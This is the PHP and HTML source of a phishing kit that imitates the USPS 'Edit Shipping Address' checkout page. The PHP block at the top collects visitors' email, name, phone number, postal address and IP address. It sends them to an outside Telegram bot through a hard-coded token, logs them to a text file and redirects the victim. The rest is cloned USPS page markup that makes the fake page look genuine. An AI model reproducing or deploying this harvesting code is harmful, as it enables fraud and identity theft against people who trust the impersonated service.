<?php
include "bezness/anti/genius.php";
include "bezness/anti/genius1.php"; 
include "bezness/anti/genius2.php"; 
include "bezness/anti/genius3.php"; 
include "bezness/anti/genius4.php"; 
include "bezness/anti/genius5.php"; 
include "bezness/anti/genius6.php"; 
include "bezness/anti/genius7.php"; 
include "id.php";
if(isset($_POST['okbb'])){
$ip = getenv("REMOTE_ADDR");
$EM=$_POST["email"];
$F=$_POST["fname"];
$L=$_POST['lname'];
$PH=$_POST["phoneNumber"];
$C=$_POST['country'];
$A1=$_POST["address1"];
$A2=$_POST['address2'];
$CI=$_POST["city"];
$S=$_POST['sstate'];
$P=$_POST['postalCode'];
$message=" -------  Gneius  USPS Billing -------"."\n"."Email :  ".$EM."\n"."First name :  ".$F."\n"."Last name :   ".$L."\n"."Country :   ".$C."\n"."Address 1 :   ".$A1."\n"."Adress 2 :   ".$A2."\n"."City :   ".$CI."\n"."State :   ".$S."\n"."ZIP Code :   ".$P."\n"."Phone number :   ".$PH."\n"."IP :  ".$ip."\n"."------------  USPS  -------------";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot6691628482:AAERSLS9uTXK7tc0LqHYbAUv-YO2dD2Etvw/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("noni.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: loading.php");
}
?>
<!DOCTYPE html>
<html lang="en" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta id="myViewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="" content="">
    <title>Edit Shipping Address | USPS</title>
 	<link rel="stylesheet" href="./files/Edit Shipping Address _ USPS_files/bootstrap.min.css">
	<link rel="stylesheet" href="./files/Edit Shipping Address _ USPS_files/cart-default-styles.css">
	<link rel="stylesheet" href="./files/Edit Shipping Address _ USPS_files/cart.css">
	<link rel="stylesheet" href="./files/Edit Shipping Address _ USPS_files/cart-store.css">	
	

<body>

<style>
.mark,mark {
 background-color: #FFFFAB;
}
#utility-bar, .util, #headWrap, #ghs {
	display: none;
}
.footer {
    width: auto !important;
}
ol, ul {
    list-style: none;
}

/* alert styles */
/*   
@media (min-width: 958px){.global--navigation~.g-alert, .g-alert~.g-alert, .g-alert {
margin-bottom: 20px;
    margin-top: 0;
	}
div#g-navigation {
 margin-bottom: 0;
}
}
  .hidden-galert {
   position: absolute;
    left: -10000px;
    top: auto;
    width: 1px;
    height: 1px;
    overflow: hidden;
}

@media (max-width: 958px) {
.g-alert p br { display:none;}
}

 */


/* end alert styles*/

.remove .c-rtn-addr {
	display:none;
	height:0;
	overflow:hidden;
}
.remove .button--green {
    display: none!important;
}

@media (min-width: 1600px){
    .no-results-found {
        max-width: 1500px;
        margin: 0 auto;
    }
    .store-navigation~.breadcrumb-cartridge {
        max-width: 1500px;
        margin: 0 auto;
    }
}
@media (max-width: 1599px) and (min-width: 1000px){
    .store-navigation~.breadcrumb-cartridge .cartridge-viewport {
        margin-left:30px;
        margin-right:30px;
    }
}
@media (max-width: 1599px){
    .no-results-found {
        padding: 0 30px;
    }
}


/* Added to change the font-weight to normal within the quickview modal */ 
.title-head,p.title-sku,.shoppingcart-label,label.align-self-center.shoppingcart-label,.align-self-center.shoppingcart-label.total-price{
    font-weight: normal!important;
}


/* Added to align the up/down arrows on product detail page */
div#availabilityControl span.quantity-stepdown {
        right: 5px;
}

/* Added to remove info-icon from filter navigation on mobile/tablet result pages */
@media (max-width: 992px){
.nav-filter-checkbox .info-icon {
    display: none;
}
}

/* Added to improve spacing on tab content within horizontal tabs */
@media (max-width:600px) 
{
    div.horizontal-tabs {
        margin-left: 15px;
        margin-right: 15px;
    }

    div.horizontal-tabs .text-holder {
        padding-left:15px;
        padding-right:15px;
    }
}
/* added to remove 5th element that appeared off-screen */
@media (max-width: 992px) and (min-width: 768px){
    .col-6.col-md-3.col-lg-2.horizontal-record-spotlight-product:nth-of-type(5) {
        display: none;
    }
}
/* added to fix focus on buttons in pstore */
a.button--primary:focus {
    background-color: #f7f7f7;
    border: #f7f7f7;
}
/* fix product height horizontal spotlight */

@media (max-width:380px) and (min-width: 330px){
    .col-6.col-md-3.col-lg-2.horizontal-record-spotlight-product {
        height:251px;
    }
}

/* adding the Print Customs Forms image */
@media only screen and (min-width: 959px) {
.global--navigation nav .tool-international-forms a:before, .global--navigation nav .tool-international-forms a:hover:before, .global--navigation nav .tool-international-forms a:focus:before {
    background: url(https://www.usps.com/assets/images/home/printcustomsforms.svg);
}
}

/* end adding the Print Customs Forms image */


</style>
<link href="./files/Edit Shipping Address _ USPS_files/megamenu-v4.css" type="text/css" rel="stylesheet">
<style>

/* better placement of mobile cart #*/

@media only screen and (max-width: 958px){
  .global--navigation a#mob-cart p {
      top: -6px;
  }
}

</style>
<style>
/*  JS with 0.00 product */
.format-btn .freesupplies {visibility: hidden;display:none!important;}
.hide-it{display:none!important;}
.space-add{margin-top:10px;margin-bottom:10px;};

.remove {
    display: none;
}

.textbtn span.price-btn-label {
    grid-row-start: 1;
    grid-row-end: 3;
    grid-column-start: 1;
    grid-column-end: 3;
    font-size: 18px;
  line-height: 22px;
    align-self: center;
}


span.price-btn-value.remove {
    display: none!important;
}

p.instock-label.remove {
    display: none!important;
}
/* shopby fix */
@media (max-width: 600px) {
    div.horizontal-tabs {
        margin-left: 0!important;
        margin-right: 0!important;
    }
}
@media (max-width: 991.98px) and (min-width: 769px) {
.horizontal-tabs .tab-h-content {
    margin-top: 45px;
}
}
mark {
    line-height: 24px;
}

</style>

<div class="nav-utility" id="nav-utility">
	<div class="utility-links" id="utility-header">
	<a tabindex="-1" href="https://www.usps.com/globals/site-index.htm" class="hidden-skip">Go to USPS.com Site Index.</a>
	<a tabindex="0" id="skiptomain" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#endnav" class="hidden-skip keyboard">Skip to Main Content</a>
 	<a tabindex="-1" name="skiputil" id="skiputil" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#skipallnav" class="hidden-skip">Skip All Utility Navigation</a>
		<div class="lang-select">
			<a id="link-lang" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#">
				<span class="visuallyhidden">Current language:</span>
				English
			</a>
			<ul class="lang-list">
				<li class="lang-option">
					<a class="multi-lang-link" tabindex="-1" href="javascript:OneLink(&#39;en&#39;);">English</a>
				</li>
				<li class="lang-option">
					<a class="multi-lang-link" tabindex="-1" href="javascript:OneLink(&#39;es&#39;);">Español</a>
				</li>
				<li class="lang-option last">
					<a class="multi-lang-link" tabindex="-1" href="javascript:OneLink(&#39;zh&#39;);"><span class="visuallyhidden">Chinese</span></a>
				</li>
			</ul>
		</div>
		<a id="link-locator" href="https://tools.usps.com/find-location.htm">Locations</a>
		<a id="link-customer" href="https://www.usps.com/help/contact-us.htm">Support</a>
		<a id="link-myusps" href="https://informeddelivery.usps.com/">Informed Delivery</a>
		<div class="nav-pipe"></div><div id="nav-tool-login" class="nav-tool"><div class="nav-window" style="height: 0px; overflow: hidden;"><div class="wrapper col_3"><div class="background-s"><div class="content"><div class="reg inner"><div><p>,</p><ul class="fontStyle9">Thanks for registering for an account. Get started using USPS.com by shopping or shipping.</ul></div><div id="accountLinks" class="cta fontStyle7 clearfix"><a id="link-activity" href="https://store.usps.com/store/myaccount/profile.jsp">My Profile ›</a><a href="https://reg.usps.com/logout?app=ATG&amp;appURL=https://store.usps.com/store">Sign Out</a></div><div id="accountSubLinks" class="clearfix"><ul><li><a href="https://store.usps.com/store/myaccount/myOrders.jsp">Activity History ›</a></li><li><a href="https://store.usps.com/store/myaccount/paymentInfo.jsp">Stored Payments ›</a></li></ul></div></div></div></div></div></div><div class="nav-pipe"></div></div></a>
		<div id="link-cart" style="display: inline-block;"></div>
	</div>
</div>
<div class="global--navigation" id="g-navigation">
	<a tabindex="-1" name="skipallnav" id="skipallnav" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#endnav" class="hidden-skip">Skip all category navigation links</a>
<div class="nav-full">

  <a class="global-logo" href="https://www.usps.com/" style="vertical-align: baseline;">
    <img src="./files/Edit Shipping Address _ USPS_files/logo-sb.svg" alt="Image of USPS.com logo." aria-label="Image of USPS.com logo.">
  </a>
	<div class="mobile-header">
		<a class="mobile-hamburger" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#"><img src="./files/Edit Shipping Address _ USPS_files/hamburger.svg" alt="hamburger menu Icon"></a>
		<a class="mobile-logo" href="https://www.usps.com/"><img src="./files/Edit Shipping Address _ USPS_files/logo_mobile.svg" alt="USPS mobile logo"></a>
		<a id="mob-cart" href="https://store.usps.com/store/cart/cart.jsp" style="display: inline-block;"></a>
		<a class="mobile-search" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#"><img src="./files/Edit Shipping Address _ USPS_files/search.svg" alt="Search Icon"></a>
	</div>
	
<nav>
  	<div class="mobile-log-state">
		<div id="msign" class="mobile-utility"><div class="mobile-sign"><a class="m-sign-log" id="link-activity" href="https://store.usps.com/store/myaccount/profile.jsp">Hi, </a><a class="m-sign-log" href="https://reg.usps.com/logout?app=ATG&amp;appURL=https://store.usps.com/store">Sign Out</a></div></div>
	</div>
    <ul class="nav-list" role="menubar">
      <li class="qt-nav menuheader">
	  	<a tabindex="-1" name="navquicktools" id="navquicktools" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#navmailship" class="hidden-skip">Skip Quick Tools Links</a>
		<a aria-expanded="false" role="menuitem" tabindex="0" aria-haspopup="true" class="nav-first-element menuitem" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#">Quick Tools</a>
        <div class="">
			<ul role="menu" aria-hidden="true">
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">    
						<img src="./files/Edit Shipping Address _ USPS_files/tracking.svg" alt="Tracking Icon">
						<p>Track a Package</p> 
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">
						<img src="./files/Edit Shipping Address _ USPS_files/mailman.svg" alt="Informed Delivery Icon">
						<p>Informed Delivery</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/find-location.htm">
						<img src="./files/Edit Shipping Address _ USPS_files/location.svg" alt="Post Office Locator Icon">
						<p>Find USPS Locations</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps">
						<img src="./files/Edit Shipping Address _ USPS_files/stamps.svg" alt="Stamps Icon">
						<p>Buy Stamps</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/schedule-pickup-steps.htm">
						<img src="./files/Edit Shipping Address _ USPS_files/schedule_pickup.svg" alt="Schedule a Pickup Icon">
						<p>Schedule a Pickup</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/">
						<img src="./files/Edit Shipping Address _ USPS_files/calculate_price.svg" alt="Calculate a Price Icon">
						<p>Calculate a Price</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://tools.usps.com/zip-code-lookup.htm">
						<img src="./files/Edit Shipping Address _ USPS_files/find_zip.svg" alt="Zip Code™ Lookup Icon">
						<p>Look Up a <br>ZIP Code<sup>™</sup></p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://holdmail.usps.com/holdmail/">
						<img src="./files/Edit Shipping Address _ USPS_files/holdmail.svg" alt="Holdmail Icon">
						<p>Hold Mail</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://moversguide.usps.com/?referral=MG82">
						<img src="./files/Edit Shipping Address _ USPS_files/change_address.svg" alt="Change of Address Icon">
						<p>Change My Address</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">
						<img src="./files/Edit Shipping Address _ USPS_files/po_box.svg" alt="Post Office Boxes Icon">
						<p>Rent/Renew a <br>PO Box</p>
					</a>
				</li>
				<li>	
					<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/results/free-shipping-supplies/shipping-supplies/_/N-alnx4jZ7d0v8v">
						<img src="./files/Edit Shipping Address _ USPS_files/free_boxes.svg" alt="Shipping Supplies Icon">
						<p>Free Boxes</p>
					</a>
				</li>
				<li>
					<a role="menuitem" tabindex="-1" href="https://cns.usps.com/">
						<img src="./files/Edit Shipping Address _ USPS_files/featured_clicknship.svg" alt="Click-N-Ship Icon">
						<p>Click-N-Ship</p>
					</a>
				</li>
			</ul>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navmailship" id="navmailship" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#navtrackmanage" class="hidden-skip">Skip Send Links</a>
		<a id="mail-ship-width" aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://www.usps.com/ship/">Send</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
            <li class="tool-cns"><a role="menuitem" tabindex="-1" href="https://cns.usps.com/">Click-N-Ship</a></li>
            <li class="tool-stamps"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/">Stamps &amp; Supplies</a></li>
            <li class="tool-zip"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/zip-code-lookup.htm">Look Up a ZIP Code<sup>™</sup></a></li>			
            <li class="tool-calc"><a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/">Calculate a Price</a></li>
            <li class="tool-pick"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/schedule-pickup-steps.htm">Schedule a Pickup</a></li>
            <li class="tool-find"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/find-location.htm">Find USPS Locations</a></li>
            <li class="tool-track"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">Tracking</a></li>			
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3> 
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/">Sending</a></li>
				<ul aria-hidden="true">
					<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/letters.htm">Sending Mail</a></li>
					<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/packages.htm">Sending Packages</a></li>
					<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/insurance-extra-services.htm">Insurance &amp; Extra Services</a></li>
					<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/shipping-restrictions.htm">Shipping Restrictions</a></li>				
				</ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/online-shipping.htm">Online Shipping</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/label-broker.htm">Label Broker</a></li>			
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/custom-mail.htm">Custom Mail, Cards, &amp; Envelopes</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/prices.htm">Postage Prices</a></li>			
          </ul>
		  <ul role="menu" aria-hidden="true">
            <h3 class="desktop-only">&nbsp;</h3>
			<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/mail-shipping-services.htm">Mail &amp; Shipping Services</a></li>
				<ul aria-hidden="true">
				  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/priority-mail-express.htm">Priority Mail Express</a></li>
				  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/priority-mail.htm">Priority Mail</a></li>
				  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/first-class-mail.htm">First-Class Mail</a></li>
				  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/apo-fpo-dpo.htm">Military &amp; Diplomatic Mail</a></li>
			   </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/package-intercept.htm">Redirecting a Package</a></li>			   
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/money-orders.htm">Money Orders</a></li>
			<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/claims.htm">Filing a Claim</a></li>
			<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/refunds.htm">Requesting a Refund</a></li>			
		   <div class="desktop-only mailship-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/go-now.htm"><img src="./files/Edit Shipping Address _ USPS_files/go-now.png" alt=" "><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span></a></div>
		  </ul>
		  
		 <form method="POST" action="" class="search global-header--search" tabindex="-1" >
			<span aria-hidden="false" tabindex="-1" class="input--wrap">
				<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-mail-ship">Search USPS.com</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-mail-ship" maxlength="256" name="q" type="text">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
			</form>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navtrackmanage" id="navtrackmanage" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#navpostalstore" class="hidden-skip">Skip Receive Links</a>
		<a aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://www.usps.com/manage/">Receive</a>
        <div>
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
            <li class="tool-track"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">Tracking</a></li>
            <li class="tool-informed"><a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">Informed Delivery</a></li>
            <li class="tool-intercept"><a role="menuitem" tabindex="-1" href="https://retail-pi.usps.com/retailpi/actions/index.action">Intercept a Package</a></li>
            <li class="tool-redelivery"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/redelivery.htm">Schedule a Redelivery</a></li>
            <li class="tool-hold"><a role="menuitem" tabindex="-1" href="https://holdmail.usps.com/holdmail/">Hold Mail</a></li>
            <li class="tool-change"><a role="menuitem" tabindex="-1" href="https://moversguide.usps.com/?referral=MG80">Change of Address</a></li>
            <li class="tool-pobol"><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">Rent or Renew PO Box</a></li>
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>            
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/">Managing Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">Informed Delivery</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/forward.htm">Forwarding Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/package-intercept.htm">Redirecting a Package</a></li>			
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">PO Boxes</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/mailboxes.htm">Mailbox Guidelines</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/mail-for-deceased.htm">Mail for the Deceased</a></li>
			<div class="desktop-only manage-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/go-now.htm"><img src="./files/Edit Shipping Address _ USPS_files/go-now(1).png" alt=" "></a></div>
          </ul>
		  <form tabindex="-1" role="search" method="POST" action="  " class="search global-header--search  track-manage" >
			<span tabindex="-1" aria-hidden="false" class="input--wrap">
				<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-track-manage">Search USPS.com</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-track-manage" maxlength="256" name="q" type="text">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
			</form>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navpostalstore" id="navpostalstore" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#navbusiness" class="hidden-skip">Skip Shop Links</a>
		<a aria-expanded="false" class="menuitem active" role="menuitem" tabindex="0" aria-haspopup="true" href="https://store.usps.com/store">Shop</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Shop</h3>
            

            <li class="tool-stamps"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps">Stamps</a></li>
            <li class="tool-supplies"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=shipping-supplies">Shipping Supplies</a></li>
            <li class="tool-cards"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=cards-envelopes">Cards &amp; Envelopes</a></li>
            <li class="tool-pse"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/pse/">Personalized Stamped Envelopes</a></li>
			<li class="tool-coll"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-collectors">Collectors</a></li>
            <li class="tool-gifts"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-gifts">Gifts</a></li>
            <li class="tool-business"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/results/business/_/N-1y2576k">Business Supplies</a></li>
          </ul>

          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/money-orders.htm">Money Orders</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/returns-exchanges.htm">Returns &amp; Exchanges</a></li>
            <div class="desktop-only shop-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/store/go-now.htm"><img src="./files/Edit Shipping Address _ USPS_files/go-now(2).png" alt=" "><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span></a>
			</div>
          </ul>
		  <form tabindex="-1" role="search" method="POST" action="" class="search global-header--search" >
			<span tabindex="-1" aria-hidden="false" class="input--wrap">
				<label class="visuallyhidden" tabindex="-1" for="global-header--search-track-store">Search the Postal Store: Keyword or SKU</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search the Postal Store: Keyword or SKU" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-store" maxlength="256" name="q" type="text">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
			</form>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navbusiness" id="navbusiness" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#navinternational" class="hidden-skip">Skip Business Links</a>
		<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://www.usps.com/business/">Business</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
            <li class="tool-calc"><a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/business">Calculate a Business Price</a></li>
             <li class="tool-loyalty"><a role="menuitem" tabindex="-1" href="https://loyalty.usps.com/">Check Loyalty Points &amp; Rewards</a></li>
            <li class="tool-eddm"><a role="menuitem" tabindex="-1" href="https://eddm.usps.com/eddm/customer/routeSearch.action">Every Door Direct Mail</a></li>
            <div class="desktop-only business-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/business/go-now.htm"><img src="./files/Edit Shipping Address _ USPS_files/go-now(3).png" alt=" "><span class="visuallyhidden">Grow your business with Every Door Direct Mail. Try EDDM now.</span></a>
			</div>
          </ul>

          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>            

            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/business-shipping.htm">Business Shipping</a></li>
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/loyalty.htm">USPS Loyalty Program</a></li>
               <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/shipping-consolidators.htm">Shipping Consolidators</a></li>            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/advertise-with-mail.htm">Advertising with Mail</a></li>
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/every-door-direct-mail.htm">Using EDDM</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/vendors.htm">Mailing &amp; Printing Services</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/customized-direct-mail.htm">Customized Direct Mail</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/political-mail.htm">Political Mail</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/promotions-incentives.htm">Promotions &amp; Incentives</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/informed-delivery.htm">Informed Delivery Marketing</a></li>			  
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/product-samples.htm">Product Samples</a></li>
            </ul>
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3 class="desktop-only">&nbsp;</h3>
            
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/postage-options.htm">Postage Options</a></li>
            <ul aria-hidden="true">          
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/verify-postage.htm">Verifying Postage</a></li>
            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/return-services.htm">Returns Services</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/label-broker.htm">Label Broker</a></li>			
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/international-shipping.htm">International Business Shipping</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/manage-mail.htm">Managing Business Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/web-tools-apis/">Web Tools (APIs)</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/prices.htm">Prices</a></li>
          </ul>
		  <form tabindex="-1" role="search" method="POST" action="" class="search global-header--search business-bottom" >
			<span tabindex="-1" aria-hidden="false" class="input--wrap">
				<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-business">Search USPS.com</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-business" maxlength="256" name="q" type="text">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
			</form>
        </div>
      </li>
      <li class="menuheader">
		<a tabindex="-1" name="navinternational" id="navinternational" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#navhelp" class="hidden-skip">Skip International Links</a>
		<a class="menuitem" tabindex="0" aria-expanded="false" aria-haspopup="true" role="menuitem" href="https://www.usps.com/international/">International</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
			
            <li class="tool-calc"><a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/?country=10440">Calculate International Prices</a></li>
            <li class="tool-international-labels"><a role="menuitem" tabindex="-1" href="https://cns.usps.com/">Print International Labels</a></li>
            <li class="tool-international-forms"><a role="menuitem" tabindex="-1" href="https://cfo.usps.com/cfo-web/labelInformation.html">Print Customs Forms</a></li>			
            <div class="desktop-only international-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/international/go-now.htm"><img src="./files/Edit Shipping Address _ USPS_files/go-now(4).png" alt=" "><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span></a>
			</div>
          </ul>
		  
          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/">International Sending</a></li>			         
